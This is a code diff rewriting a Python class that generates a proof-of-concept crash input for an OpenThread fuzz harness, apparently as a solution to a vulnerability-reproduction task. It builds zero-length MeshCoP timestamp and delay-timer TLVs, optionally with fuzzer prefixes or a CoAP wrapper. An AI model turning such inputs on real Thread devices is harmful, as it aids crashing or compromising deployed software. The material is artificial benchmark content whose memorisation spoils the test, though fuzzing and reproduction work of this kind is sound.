@@ -1,375 +1,432 @@
 import os
 import re
 import tarfile
-import tempfile
-from typing import Dict, List, Optional, Set, Tuple
+import struct
+from typing import Dict, Iterable, List, Optional, Tuple
 
 
 class Solution:
-    def _is_dir(self, p: str) -> bool:
-        try:
-            return os.path.isdir(p)
-        except Exception:
-            return False
+    def solve(self, src_path: str) -> bytes:
+        active_type, pending_type, delay_type = self._infer_tlv_types(src_path)
 
-    def _ensure_src_dir(self, src_path: str) -> Tuple[str, Optional[tempfile.TemporaryDirectory]]:
-        if self._is_dir(src_path):
-            return src_path, None
-        td = tempfile.TemporaryDirectory()
-        root = td.name
-        try:
-            with tarfile.open(src_path, "r:*") as tf:
-                def is_within_directory(directory: str, target: str) -> bool:
-                    abs_directory = os.path.abspath(directory)
-                    abs_target = os.path.abspath(target)
-                    return os.path.commonprefix([abs_directory, abs_target]) == abs_directory
+        payload = bytes([
+            active_type & 0xFF, 0x00,
+            pending_type & 0xFF, 0x00,
+            delay_type & 0xFF, 0x00,
+        ])
 
-                for m in tf.getmembers():
-                    if not m.name:
+        fuzzer_code = self._find_most_relevant_fuzzer(src_path)
+        if not fuzzer_code:
+            return payload
+
+        code = self._strip_cpp_comments(fuzzer_code)
+
+        direct = self._is_direct_tlvs_input(code)
+        if direct:
+            return payload
+
+        prefix = self._infer_fuzzed_data_provider_prefix(code, payload_len=len(payload))
+        if prefix is not None:
+            return prefix + payload
+
+        if self._looks_like_raw_coap_input(code):
+            return self._build_min_coap_with_uri_paths(["a", "ms"], payload)
+
+        return payload
+
+    def _iter_text_files(self, src_path: str) -> Iterable[Tuple[str, str]]:
+        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".inc", ".ipp")
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    if not fn.lower().endswith(exts):
                         continue
-                    dest = os.path.join(root, m.name)
-                    if not is_within_directory(root, dest):
+                    p = os.path.join(root, fn)
+                    try:
+                        with open(p, "rb") as f:
+                            data = f.read(2_000_000)
+                        yield p, data.decode("utf-8", errors="ignore")
+                    except Exception:
                         continue
-                tf.extractall(root)
-        except Exception:
-            # If not a tarball, treat as directory path anyway
-            return src_path, td
-        # Some tarballs have a single top directory
-        try:
-            entries = [e for e in os.listdir(root) if e not in (".", "..")]
-            if len(entries) == 1:
-                one = os.path.join(root, entries[0])
-                if os.path.isdir(one):
-                    return one, td
-        except Exception:
-            pass
-        return root, td
+            return
 
-    def _iter_source_files(self, root: str) -> List[str]:
-        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"}
-        out = []
-        for dirpath, _, filenames in os.walk(root):
-            for fn in filenames:
-                _, ext = os.path.splitext(fn)
-                if ext.lower() in exts:
-                    out.append(os.path.join(dirpath, fn))
-        return out
+        if tarfile.is_tarfile(src_path):
+            try:
+                with tarfile.open(src_path, "r:*") as tf:
+                    for m in tf.getmembers():
+                        if not m.isfile():
+                            continue
+                        name = m.name
+                        if not name.lower().endswith(exts):
+                            continue
+                        if m.size > 8_000_000:
+                            continue
+                        try:
+                            f = tf.extractfile(m)
+                            if f is None:
+                                continue
+                            data = f.read(2_000_000)
+                            yield name, data.decode("utf-8", errors="ignore")
+                        except Exception:
+                            continue
+            except Exception:
+                return
+            return
 
-    def _read_text(self, path: str, limit: int = 2_000_000) -> str:
-        try:
-            with open(path, "rb") as f:
-                data = f.read(limit)
-            return data.decode("utf-8", errors="ignore")
-        except Exception:
-            return ""
+    def _infer_tlv_types(self, src_path: str) -> Tuple[int, int, int]:
+        defaults = {"kActiveTimestamp": 14, "kPendingTimestamp": 15, "kDelayTimer": 52}
+        found: Dict[str, int] = {}
 
-    def _parse_int(self, s: str) -> Optional[int]:
-        s = s.strip()
-        if not s:
-            return None
-        try:
-            return int(s, 0)
-        except Exception:
-            return None
+        enum_pat = re.compile(r"\b(kActiveTimestamp|kPendingTimestamp|kDelayTimer)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)\b")
+        define_pat = re.compile(
+            r"^\s*#\s*define\s+(OT_MESHCOP_TLV_ACTIVE_TIMESTAMP|OT_MESHCOP_TLV_PENDING_TIMESTAMP|OT_MESHCOP_TLV_DELAY_TIMER)\s+(0x[0-9a-fA-F]+|\d+)\b",
+            re.MULTILINE,
+        )
 
-    def _find_macro_define(self, root: str, name: str) -> Optional[int]:
-        pat = re.compile(r"^\s*#\s*define\s+" + re.escape(name) + r"\s+([0-9]+|0x[0-9A-Fa-f]+)\b", re.M)
-        for path in self._iter_source_files(root):
-            txt = self._read_text(path)
-            if name not in txt:
-                continue
-            m = pat.search(txt)
-            if m:
-                return self._parse_int(m.group(1))
-        return None
+        for _, text in self._iter_text_files(src_path):
+            if len(found) == 3:
+                break
 
-    def _find_enum_assign(self, root: str, name: str) -> Optional[int]:
-        pat = re.compile(r"\b" + re.escape(name) + r"\b\s*=\s*([0-9]+|0x[0-9A-Fa-f]+)\b")
-        for path in self._iter_source_files(root):
-            txt = self._read_text(path)
-            if name not in txt:
-                continue
-            m = pat.search(txt)
-            if m:
-                return self._parse_int(m.group(1))
-        return None
+            for m in enum_pat.finditer(text):
+                k = m.group(1)
+                v = m.group(2)
+                try:
+                    found[k] = int(v, 0)
+                except Exception:
+                    pass
 
-    def _find_symbol_any(self, root: str, name: str) -> Optional[int]:
-        v = self._find_macro_define(root, name)
-        if v is not None:
-            return v
-        return self._find_enum_assign(root, name)
+            for m in define_pat.finditer(text):
+                mk = m.group(1)
+                v = m.group(2)
+                try:
+                    iv = int(v, 0)
+                except Exception:
+                    continue
+                if mk.endswith("ACTIVE_TIMESTAMP"):
+                    found["kActiveTimestamp"] = iv
+                elif mk.endswith("PENDING_TIMESTAMP"):
+                    found["kPendingTimestamp"] = iv
+                elif mk.endswith("DELAY_TIMER"):
+                    found["kDelayTimer"] = iv
 
-    def _select_fuzzer_file(self, root: str) -> Optional[str]:
-        best = None
+        active = found.get("kActiveTimestamp", defaults["kActiveTimestamp"]) & 0xFF
+        pending = found.get("kPendingTimestamp", defaults["kPendingTimestamp"]) & 0xFF
+        delay = found.get("kDelayTimer", defaults["kDelayTimer"]) & 0xFF
+
+        return active, pending, delay
+
+    def _find_most_relevant_fuzzer(self, src_path: str) -> Optional[str]:
         best_score = -1
+        best_text = None
+
         keys = [
             "LLVMFuzzerTestOneInput",
-            "otDataset",
-            "OperationalDataset",
             "Dataset",
+            "MeshCoP",
             "IsTlvValid",
+            "otDatasetParseTlvs",
+            "otDatasetSetActiveTlvs",
+            "otDatasetSetPendingTlvs",
             "ActiveTimestamp",
             "PendingTimestamp",
             "DelayTimer",
-            "otOperationalDatasetTlvs",
-            "otDatasetSetActiveTlvs",
-            "otDatasetSetPendingTlvs",
-            "MeshCoP",
+            "FuzzedDataProvider",
         ]
-        for path in self._iter_source_files(root):
-            txt = self._read_text(path, limit=1_000_000)
-            if "LLVMFuzzerTestOneInput" not in txt:
+
+        for _, text in self._iter_text_files(src_path):
+            if "LLVMFuzzerTestOneInput" not in text:
                 continue
             score = 0
             for k in keys:
-                if k in txt:
-                    score += 3 if k in ("otDatasetSetActiveTlvs", "otDatasetSetPendingTlvs", "IsTlvValid") else 1
+                if k in text:
+                    score += 5 if k == "LLVMFuzzerTestOneInput" else 1
             if score > best_score:
                 best_score = score
-                best = path
-        return best
+                best_text = text
 
-    def _find_is_tlv_valid_file(self, root: str) -> Optional[str]:
-        needles = ["IsTlvValid", "Dataset::IsTlvValid"]
-        for path in self._iter_source_files(root):
-            txt = self._read_text(path, limit=1_500_000)
-            if any(n in txt for n in needles):
-                # Heuristic: prefer .cpp/.cc
-                _, ext = os.path.splitext(path.lower())
-                if ext in (".cpp", ".cc", ".cxx"):
-                    return path
-        # fallback: any file
-        for path in self._iter_source_files(root):
-            txt = self._read_text(path, limit=1_500_000)
-            if any(n in txt for n in needles):
-                return path
-        return None
+        return best_text
 
-    def _unknown_tlv_allowed(self, root: str) -> Optional[bool]:
-        path = self._find_is_tlv_valid_file(root)
-        if not path:
-            return None
-        txt = self._read_text(path, limit=2_000_000)
-        if "IsTlvValid" not in txt:
-            return None
+    def _strip_cpp_comments(self, s: str) -> str:
+        s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
+        s = re.sub(r"//.*?$", "", s, flags=re.MULTILINE)
+        return s
 
-        # Try to isolate the function body roughly
-        idx = txt.find("IsTlvValid")
-        if idx == -1:
-            return None
-        snippet = txt[idx: idx + 12000]
-
-        dpos = snippet.find("default")
-        if dpos == -1:
-            # no default => likely rejects unknown or handles all; can't tell
-            return None
-        after = snippet[dpos: dpos + 400].lower()
-
-        # If default explicitly makes it false or exits, unknown rejected
-        reject_markers = [
-            "return false",
-            "isvalid = false",
-            "is_valid = false",
-            "exitnow(false",
-            "verifyorexit(false",
-            "ot_exit_now",
-            "exit now",
+    def _is_direct_tlvs_input(self, code: str) -> bool:
+        direct_calls = [
+            r"\botDatasetParseTlvs\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*,",
+            r"\botDatasetSetActiveTlvs\s*\(\s*[^,]*,\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)",
+            r"\botDatasetSetPendingTlvs\s*\(\s*[^,]*,\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)",
         ]
-        for m in reject_markers:
-            if m in after:
-                return False
-
-        # If default just breaks or does nothing, unknown likely allowed
-        allow_markers = ["break", ";"]
-        for m in allow_markers:
-            if m in after:
+        for pat in direct_calls:
+            if re.search(pat, code):
                 return True
-        return None
 
-    def _collect_known_tlv_types(self, root: str) -> Set[int]:
-        known: Set[int] = set()
-        # Attempt to find an enum listing TLV types
-        candidates = []
-        for path in self._iter_source_files(root):
-            base = os.path.basename(path).lower()
-            if "tlv" in base and ("meshcop" in base or "dataset" in base or "mle" in base):
-                candidates.append(path)
-        # Add files likely containing TLV enums
-        candidates = candidates[:80] + [p for p in self._iter_source_files(root) if p not in candidates][:20]
+        if re.search(r"\bAppendBytes\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)", code):
+            return True
 
-        enum_assign_pat = re.compile(r"\b(k[A-Za-z0-9_]*Timestamp|kDelayTimer|kNetworkName|kChannelMask|kNetworkKey|kPskc|kExtendedPanId|kPanId|kMeshLocalPrefix|kSecurityPolicy|kChannel)\b\s*=\s*([0-9]+|0x[0-9A-Fa-f]+)\b")
-        any_assign_pat = re.compile(r"\b(k[A-Za-z0-9_]+)\b\s*=\s*([0-9]+|0x[0-9A-Fa-f]+)\b")
+        return False
 
-        for path in candidates:
-            txt = self._read_text(path, limit=1_500_000)
-            if "enum" not in txt and "kType" not in txt and "kActiveTimestamp" not in txt:
-                continue
-            for m in enum_assign_pat.finditer(txt):
-                v = self._parse_int(m.group(2))
-                if v is not None and 0 <= v <= 255:
-                    known.add(v)
-            # If we got too few, broaden
-            if len(known) < 10 and ("Tlv" in txt or "TLV" in txt):
-                for m in any_assign_pat.finditer(txt):
-                    v = self._parse_int(m.group(2))
-                    if v is not None and 0 <= v <= 255:
-                        known.add(v)
-            if len(known) >= 60:
-                break
-        return known
+    def _infer_fuzzed_data_provider_prefix(self, code: str, payload_len: int) -> Optional[bytes]:
+        init_m = re.search(r"\bFuzzedDataProvider\s+([A-Za-z_]\w*)\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)\s*;", code)
+        if not init_m:
+            init_m = re.search(r"\bFuzzedDataProvider\s+([A-Za-z_]\w*)\s*\(\s*(?:aData|data)\s*,\s*(?:aSize|size)\s*\)\s*(?:\{|$)", code)
+        if not init_m:
+            return None
+        fdp = init_m.group(1)
 
-    def _choose_unused_type(self, known: Set[int]) -> int:
-        # Prefer vendor/reserved range to avoid clashes
-        for t in range(0x80, 0x100):
-            if t not in known:
-                return t
-        for t in range(0, 0x80):
-            if t not in known:
-                return t
-        return 0xFF
-
-    def _infer_prefix_from_fuzzer(self, fuzzer_txt: str, max_len: int) -> Tuple[bytes, int]:
-        # Return (prefix_bytes, bytes_consumed_before_tlvs)
-        if "FuzzedDataProvider" not in fuzzer_txt:
-            return b"", 0
-
-        # Look for ConsumeIntegralInRange<type>(0, OT_OPERATIONAL_DATASET_MAX_LENGTH) used as length
-        m = re.search(
-            r"ConsumeIntegralInRange\s*<\s*([A-Za-z0-9_:]+)\s*>\s*\(\s*([^\),]+)\s*,\s*([^\)]+)\)",
-            fuzzer_txt,
-        )
-        if not m:
-            return b"", 0
-
-        tname = m.group(1).strip()
-        min_expr = m.group(2).strip()
-        max_expr = m.group(3).strip()
-
-        def eval_bound(expr: str) -> Optional[int]:
-            expr = expr.strip()
-            expr = re.sub(r"\s+", "", expr)
-            if expr == "OT_OPERATIONAL_DATASET_MAX_LENGTH":
-                return max_len
-            if expr == "OT_OPERATIONAL_DATASET_MAX_LENGTH-1":
-                return max_len - 1
-            if expr == "sizeof(dataset.mTlvs)-1" or expr == "sizeof(dataset.mTlvs)-1u":
-                return max_len - 1
-            if expr == "sizeof(dataset.mTlvs)" or expr == "sizeof(dataset.mTlvs)":
-                return max_len
-            if expr.isdigit() or expr.lower().startswith("0x"):
-                return self._parse_int(expr)
+        call_m = re.search(r"\botDatasetParseTlvs\s*\(\s*([^,]+)\s*,\s*([^,]+)\s*,", code)
+        if not call_m:
             return None
 
-        min_v = eval_bound(min_expr)
-        max_v = eval_bound(max_expr)
-        if min_v is None:
-            min_v = 0
-        if max_v is None:
-            max_v = max_len
+        arg1 = call_m.group(1).strip()
+        arg2 = call_m.group(2).strip()
+        if re.search(r"\b(?:aData|data)\b", arg1) and re.search(r"\b(?:aSize|size)\b", arg2):
+            return b""
 
-        target = max_v
-        remainder = target - min_v
-        if remainder < 0:
-            remainder = 0
+        buf_var = None
+        m = re.search(r"\b([A-Za-z_]\w*)\s*\.\s*data\s*\(\s*\)", arg1)
+        if m:
+            buf_var = m.group(1)
+        else:
+            m = re.search(r"\b([A-Za-z_]\w*)\s*->\s*data\s*\(\s*\)", arg1)
+            if m:
+                buf_var = m.group(1)
+        if not buf_var:
+            return None
 
-        # Encode the consumed integral so that value % (range) == remainder
-        # Most implementations consume integral in native endianness; assume little-endian.
-        if tname.endswith("size_t") or tname == "size_t":
-            n = (8 if (8 == (8 if True else 8)) else 8)
-            prefix = int(remainder).to_bytes(n, "little", signed=False)
-            return prefix, n
-        if tname.endswith("uint8_t") or tname == "uint8_t" or tname.endswith("unsignedchar"):
-            n = 1
-            prefix = bytes([remainder & 0xFF])
-            return prefix, n
-        if tname.endswith("uint16_t") or tname == "uint16_t":
-            n = 2
-            prefix = int(remainder & 0xFFFF).to_bytes(n, "little", signed=False)
-            return prefix, n
-        if tname.endswith("uint32_t") or tname == "uint32_t":
-            n = 4
-            prefix = int(remainder & 0xFFFFFFFF).to_bytes(n, "little", signed=False)
-            return prefix, n
-        # Default: assume size_t
-        n = 8
-        prefix = int(remainder).to_bytes(n, "little", signed=False)
-        return prefix, n
+        assign_pat = re.compile(r"\b" + re.escape(buf_var) + r"\b[^;]*=\s*([^;]+);")
+        assigns = list(assign_pat.finditer(code))
+        if not assigns:
+            return None
 
-    def _build_tlvs(self, total_len: int, active_ts_type: int, network_name_type: Optional[int], unknown_allowed: bool, known_types: Set[int]) -> bytes:
-        if total_len < 4:
-            return bytes([active_ts_type, 0])
+        assigns.sort(key=lambda mm: mm.start())
+        target_assign = None
+        for mm in assigns:
+            if mm.start() < call_m.start():
+                target_assign = mm
+            else:
+                break
+        if target_assign is None:
+            return None
 
-        final = bytes([active_ts_type & 0xFF, 0x00])
-        pad_total = total_len - len(final)
+        rhs = target_assign.group(1)
 
-        # Prefer single unknown padding TLV if unknown allowed (and helps if duplicates are rejected elsewhere)
-        if unknown_allowed and pad_total >= 2:
-            pad_type = self._choose_unused_type(known_types | {active_ts_type & 0xFF})
-            pad_len = pad_total - 2
-            if 0 <= pad_len <= 255:
-                return bytes([pad_type & 0xFF, pad_len & 0xFF]) + (b"\x00" * pad_len) + final
+        if re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeRemainingBytes\s*<\s*uint8_t\s*>\s*\(", rhs):
+            pre = self._count_and_build_simple_consumes(code[init_m.end():target_assign.start()], fdp, want_len=None)
+            if pre is None:
+                return None
+            return pre
 
-        # Otherwise, try to pad with repeated NetworkName TLVs (len up to 16)
-        if network_name_type is not None:
-            out = bytearray()
-            remaining = pad_total
-            # ensure we can always complete remaining exactly with final TLV stream
-            while remaining > 0:
-                if remaining < 3:
-                    break
-                l = min(16, remaining - 2)
-                if l < 1:
-                    break
-                out.append(network_name_type & 0xFF)
-                out.append(l & 0xFF)
-                out.extend(b"A" * l)
-                remaining -= (2 + l)
-            if remaining == 0:
-                out.extend(final)
-                return bytes(out)
+        mcb = re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeBytes\s*<\s*uint8_t\s*>\s*\(\s*([^)]+)\s*\)", rhs)
+        if mcb:
+            len_expr = mcb.group(1).strip()
+            if re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*remaining_bytes\s*\(\s*\)", len_expr):
+                pre = self._count_and_build_simple_consumes(code[init_m.end():target_assign.start()], fdp, want_len=None)
+                if pre is None:
+                    return None
+                return pre
 
-        # Fallback: single padding TLV with some type (even if unknown disallowed, try anyway)
-        pad_type = self._choose_unused_type(known_types | {active_ts_type & 0xFF})
-        pad_len = pad_total - 2
-        if pad_total >= 2 and 0 <= pad_len <= 255:
-            return bytes([pad_type & 0xFF, pad_len & 0xFF]) + (b"\x00" * pad_len) + final
+            if re.fullmatch(r"\d+", len_expr):
+                want = int(len_expr)
+                if want != payload_len:
+                    return None
+                pre = self._count_and_build_simple_consumes(code[init_m.end():target_assign.start()], fdp, want_len=None)
+                if pre is None:
+                    return None
+                return pre
 
-        # Last resort: just final
-        return final
+            if re.fullmatch(r"[A-Za-z_]\w*", len_expr):
+                len_var = len_expr
+                pre = self._build_prefix_for_len_var(code, init_m.end(), target_assign.start(), fdp, len_var, payload_len)
+                return pre
 
-    def solve(self, src_path: str) -> bytes:
-        root, td = self._ensure_src_dir(src_path)
+        return None
+
+    def _count_and_build_simple_consumes(self, snippet: str, fdp: str, want_len: Optional[int]) -> Optional[bytes]:
+        total = 0
+        parts: List[bytes] = []
+
+        snippet = snippet[:20000]
+
+        patterns = [
+            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeBool\s*\(\s*\)"), ("bool", 0)),
+            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegral\s*<\s*([^>]+)\s*>\s*\(\s*\)"), ("integral", 0)),
+            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegralInRange\s*<\s*([^>]+)\s*>\s*\("), ("inrange", 0)),
+            (re.compile(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeEnum\s*<\s*([^>]+)\s*>\s*\(\s*\)"), ("enum", 0)),
+        ]
+
+        idx = 0
+        while idx < len(snippet):
+            next_m = None
+            next_kind = None
+            for pat, (kind, _) in patterns:
+                m = pat.search(snippet, idx)
+                if m and (next_m is None or m.start() < next_m.start()):
+                    next_m = m
+                    next_kind = kind
+            if next_m is None:
+                break
+
+            if next_kind == "bool":
+                parts.append(b"\x00")
+                total += 1
+                idx = next_m.end()
+                continue
+
+            if next_kind in ("integral", "inrange", "enum"):
+                t = "uint8_t"
+                if next_kind != "bool":
+                    if next_m.lastindex and next_m.group(1):
+                        t = next_m.group(1).strip()
+                size, packfmt = self._sizeof_cpp_type_and_packfmt(t)
+                if size is None:
+                    return None
+                parts.append(b"\x00" * size)
+                total += size
+                idx = next_m.end()
+                continue
+
+            idx = next_m.end()
+
+        return b"".join(parts)
+
+    def _build_prefix_for_len_var(self, code: str, init_end: int, assign_start: int, fdp: str, len_var: str, want_len: int) -> Optional[bytes]:
+        snippet = code[init_end:assign_start]
+        snippet = snippet[:80000]
+
+        len_assign_pat = re.compile(r"\b" + re.escape(len_var) + r"\b\s*=\s*([^;]+);")
+        assigns = list(len_assign_pat.finditer(snippet))
+        if not assigns:
+            return None
+
+        len_assign = assigns[-1]
+        rhs = len_assign.group(1)
+
+        min_snip = snippet[:len_assign.start()]
+        pre_before = self._count_and_build_simple_consumes(min_snip, fdp, want_len=None)
+        if pre_before is None:
+            return None
+
+        m_inrange = re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegralInRange\s*<\s*([^>]+)\s*>\s*\(", rhs)
+        if m_inrange:
+            t = m_inrange.group(1).strip()
+            size, packfmt = self._sizeof_cpp_type_and_packfmt(t)
+            if size is None:
+                return None
+            val_bytes = self._pack_value(want_len, packfmt, size)
+            if val_bytes is None:
+                return None
+            post_after = self._count_and_build_simple_consumes(snippet[len_assign.end():], fdp, want_len=None)
+            if post_after is None:
+                return None
+            return pre_before + val_bytes + post_after
+
+        m_int = re.search(r"\b" + re.escape(fdp) + r"\s*\.\s*ConsumeIntegral\s*<\s*([^>]+)\s*>\s*\(\s*\)", rhs)
+        if m_int:
+            t = m_int.group(1).strip()
+            size, packfmt = self._sizeof_cpp_type_and_packfmt(t)
+            if size is None:
+                return None
+            val_bytes = self._pack_value(want_len, packfmt, size)
+            if val_bytes is None:
+                return None
+            post_after = self._count_and_build_simple_consumes(snippet[len_assign.end():], fdp, want_len=None)
+            if post_after is None:
+                return None
+            return pre_before + val_bytes + post_after
+
+        return None
+
+    def _sizeof_cpp_type_and_packfmt(self, t: str) -> Tuple[Optional[int], Optional[str]]:
+        t = t.strip()
+        t = re.sub(r"\bconst\b", "", t)
+        t = re.sub(r"\bvolatile\b", "", t)
+        t = re.sub(r"\s+", " ", t).strip()
+
+        mapping = {
+            "uint8_t": (1, "<B"),
+            "int8_t": (1, "<b"),
+            "char": (1, "<b"),
+            "unsigned char": (1, "<B"),
+            "bool": (1, "<B"),
+            "uint16_t": (2, "<H"),
+            "int16_t": (2, "<h"),
+            "unsigned short": (2, "<H"),
+            "short": (2, "<h"),
+            "uint32_t": (4, "<I"),
+            "int32_t": (4, "<i"),
+            "unsigned int": (4, "<I"),
+            "int": (4, "<i"),
+            "uint64_t": (8, "<Q"),
+            "int64_t": (8, "<q"),
+            "unsigned long": (8, "<Q"),
+            "long": (8, "<q"),
+            "size_t": (8, "<Q"),
+        }
+
+        if t in mapping:
+            return mapping[t]
+
+        t2 = t.replace("std::", "")
+        if t2 in mapping:
+            return mapping[t2]
+
+        t3 = t.replace("unsigned", "unsigned ").strip()
+        t3 = re.sub(r"\s+", " ", t3)
+        if t3 in mapping:
+            return mapping[t3]
+
+        if "size_t" in t:
+            return (8, "<Q")
+
+        return (None, None)
+
+    def _pack_value(self, v: int, packfmt: str, size: int) -> Optional[bytes]:
         try:
-            max_len = self._find_symbol_any(root, "OT_OPERATIONAL_DATASET_MAX_LENGTH")
-            if max_len is None or max_len <= 0 or max_len > 2048:
-                max_len = 254
+            if packfmt in ("<B", "<b"):
+                return struct.pack(packfmt, v & 0xFF)
+            if packfmt in ("<H", "<h"):
+                return struct.pack(packfmt, v & 0xFFFF)
+            if packfmt in ("<I", "<i"):
+                return struct.pack(packfmt, v & 0xFFFFFFFF)
+            if packfmt in ("<Q", "<q"):
+                return struct.pack(packfmt, v & 0xFFFFFFFFFFFFFFFF)
+        except Exception:
+            return None
+        try:
+            return int(v).to_bytes(size, "little", signed=False)
+        except Exception:
+            return None
 
-            active_ts = self._find_symbol_any(root, "kActiveTimestamp")
-            if active_ts is None:
-                active_ts = self._find_symbol_any(root, "OT_MESHCOP_TLV_ACTIVE_TIMESTAMP")
-            if active_ts is None:
-                active_ts = 9  # common in some implementations
+    def _looks_like_raw_coap_input(self, code: str) -> bool:
+        if "Coap" not in code and "COAP" not in code:
+            return False
+        if re.search(r"\bCoap::Message\b", code) and re.search(r"\bParse\b", code) and re.search(r"\bdata\b", code):
+            return True
+        if re.search(r"\bCoap\b", code) and re.search(r"\bMessage\b", code) and re.search(r"\bFromBytes\b", code):
+            return True
+        return False
 
-            net_name = self._find_symbol_any(root, "kNetworkName")
-            if net_name is None:
-                net_name = self._find_symbol_any(root, "OT_MESHCOP_TLV_NETWORK_NAME")
+    def _build_min_coap_with_uri_paths(self, uri_paths: List[str], payload: bytes) -> bytes:
+        ver_type_tkl = 0x50  # ver=1, type=NON, tkl=0
+        code = 0x02          # POST
+        msg_id = 0x0000
+        out = bytearray()
+        out += bytes([ver_type_tkl, code, (msg_id >> 8) & 0xFF, msg_id & 0xFF])
 
-            unknown_allowed = self._unknown_tlv_allowed(root)
-            if unknown_allowed is None:
-                unknown_allowed = True
+        last_opt = 0
+        URI_PATH = 11
 
-            known_types = self._collect_known_tlv_types(root)
+        for seg in uri_paths:
+            seg_b = seg.encode("utf-8", errors="ignore")
+            delta = URI_PATH - last_opt
+            length = len(seg_b)
+            if not (0 <= delta <= 12 and 0 <= length <= 12):
+                continue
+            out.append((delta << 4) | length)
+            out += seg_b
+            last_opt = URI_PATH
 
-            fuzzer_path = self._select_fuzzer_file(root)
-            prefix = b""
-            if fuzzer_path:
-                ftxt = self._read_text(fuzzer_path, limit=2_000_000)
-                prefix, _ = self._infer_prefix_from_fuzzer(ftxt, max_len)
-
-            tlvs = self._build_tlvs(max_len, active_ts, net_name, bool(unknown_allowed), known_types)
-
-            return prefix + tlvs
-        finally:
-            if td is not None:
-                td.cleanup()
+        out.append(0xFF)
+        out += payload
+        return bytes(out)
